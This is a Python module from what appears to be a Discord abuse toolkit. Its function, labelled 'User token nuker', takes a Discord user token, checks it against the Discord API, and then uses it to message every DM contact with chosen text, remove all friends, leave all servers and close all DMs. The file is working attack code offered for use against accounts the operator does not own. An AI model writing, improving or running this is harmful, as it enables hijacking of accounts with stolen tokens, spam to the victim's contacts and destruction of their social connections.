import asyncio
import httpx
import os
import time
import sys
from config.settings import *

def nuke_token():
        os.system("cls")
        Slow(discord_banner)
        time.sleep(1.5)
        os.system("cls")
        print(f"{bracketopen}!{bracketclosed} {Fore.BLUE}User token nuker{Style.RESET_ALL}")
        print("")
        token = input(f"{bracketopen}>{bracketclosed} {Fore.BLUE}User token -> {Style.RESET_ALL}")
        message = input(f"{bracketopen}>{bracketclosed} {Fore.BLUE}Dm message -> {Style.RESET_ALL}")

        try:
            check_res = requests.get(
                    "https://discord.com/api/v9/users/@me", 
                    headers={"Authorization": token}
                )
            
            if check_res.status_code == 200:
                asyncio.run(main(HEADERS={"Authorization": token}, dm_message=message))
            else:
                print("")
                print(f"{bracketopen}{Fore.WHITE}!{Style.RESET_ALL}{bracketclosed}{Fore.BLUE} Invalid token{Style.RESET_ALL}")
                time.sleep(2)

        except Exception:
            print("")
            print(f"{bracketopen}{Fore.WHITE}!{Style.RESET_ALL}{bracketclosed}{Fore.BLUE} Invalid token{Style.RESET_ALL}")
            time.sleep(2)
        
async def main(HEADERS, dm_message):
    async with httpx.AsyncClient() as client:

        print("")
        print(f"{bracketopen}~{bracketclosed} {Fore.BLUE}Nuking token... {Style.RESET_ALL}")
        time.sleep(1.5)
        print("────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────")
        time.sleep(0.05)

        BASE_URL = "https://discord.com/api/v9"

        #Dm everyone
        res = await client.get(
            f"{BASE_URL}/users/@me/channels", headers=HEADERS
        )

        if res.status_code == 200:
            channels = res.json()
            for channel in channels:
                dm_id = channel["id"]
                try:
                    await client.post(
                        f"{BASE_URL}/channels/{dm_id}/messages",
                        headers=HEADERS,
                        json={"content": dm_message}
                    )
        
                    time.sleep(0.3)
                except Exception:
                    pass
                
            print(f"{bracketopen2}{Fore.BLUE}+{Style.RESET_ALL}{bracketclosed2}{Fore.BLUE} Messaged all friends{Style.RESET_ALL}")  

        #unfriend all
        res = await client.get(
            f"{BASE_URL}/users/@me/relationships", headers=HEADERS
        )

        if res.status_code == 200:
            friends = res.json()
            for friend in friends:
                friend_id = friend["id"]
                try:
                    delete_res = await client.delete(
                            f"{BASE_URL}/users/@me/relationships/{friend_id}",
                            headers=HEADERS)
                except Exception:
                    pass
                
            print(f"{bracketopen2}{Fore.BLUE}+{Style.RESET_ALL}{bracketclosed2}{Fore.BLUE} Deleted all friends{Style.RESET_ALL}")

        #leave all servers
        res = await client.get(
            f"{BASE_URL}/users/@me/guilds", headers=HEADERS
        )

        if res.status_code == 200:
            guilds = res.json()
            for guild in guilds:
                guild_id = guild["id"]
                try:
                    delete_res = await client.delete(
                            f"{BASE_URL}/users/@me/guilds/{guild_id}",
                            headers=HEADERS)
                except Exception:
                    pass
                
            print(f"{bracketopen2}{Fore.BLUE}+{Style.RESET_ALL}{bracketclosed2}{Fore.BLUE} Left all servers{Style.RESET_ALL}")

        #close all dms
        res = await client.get(
            f"{BASE_URL}/users/@me/channels", headers=HEADERS
        )

        if res.status_code == 200:
            channels = res.json()
            for channel in channels:
                dm_id = channel["id"]
                try:
                    delete_res = await client.delete(
                            f"{BASE_URL}/channels/{dm_id}",
                            headers=HEADERS)
                except Exception:
                    pass
                
            print(f"{bracketopen2}{Fore.BLUE}+{Style.RESET_ALL}{bracketclosed2}{Fore.BLUE} Closed all dms{Style.RESET_ALL}")  

        time.sleep(0.05)
        print("────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────")

        print("")
        print(f"{bracketopen}{Fore.WHITE}01{Style.RESET_ALL}{bracketclosed}{Fore.BLUE} Main Menu{Style.RESET_ALL}")
        print(f"{bracketopen}{Fore.WHITE}02{Style.RESET_ALL}{bracketclosed}{Fore.BLUE} Exit{Style.RESET_ALL}")
        print("")

        command = input(f"""{Fore.BLUE} ┌──({Fore.WHITE}{username}{Fore.BLUE})─[{Fore.WHITE}~/{system_text}/{pc_name}{Fore.BLUE}]
 └─{Fore.WHITE}$ {Style.RESET_ALL}""")

        if command == "1" or command == "01":
            pass
        elif command == "2" or command == "02":
            sys.exit()
        else:
            pass